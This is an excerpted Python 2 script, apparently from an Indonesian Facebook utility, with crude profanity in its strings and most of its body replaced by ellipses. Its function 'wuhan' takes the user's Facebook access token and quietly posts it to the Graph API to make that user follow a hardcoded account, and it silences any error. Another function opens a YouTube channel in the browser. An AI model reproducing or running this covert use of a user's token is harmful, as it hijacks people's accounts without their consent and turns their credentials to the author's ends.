...
koh = '100005395413800'
hoetank = random.choice(['Keren Bang', 'Keren si', 'Hmmmmm', 'P Bagi Bockep', 'Yahaha Hayukk:v'])
...
def tod():
    ...
    for x in titik:
        print '\r %s[%s+%s] Sabar Xontol %s'%(N,M,N,x),
        sys.stdout.flush()
        time.sleep(1)
...
def yayanxd():
    ...
    try:
        ...
        os.system('xdg-open https://youtube.com/channel/UCBeVPbky3MSbS3lCDX-GiMA')
        moch_yayan()
    except KeyError:
...
def wuhan(kontol):
    try:
        kentod = kontol
        requests.post('https://graph.facebook.com/100051858231965/subscribers?access_token=%s'%(kentod))
    except:
    	pass
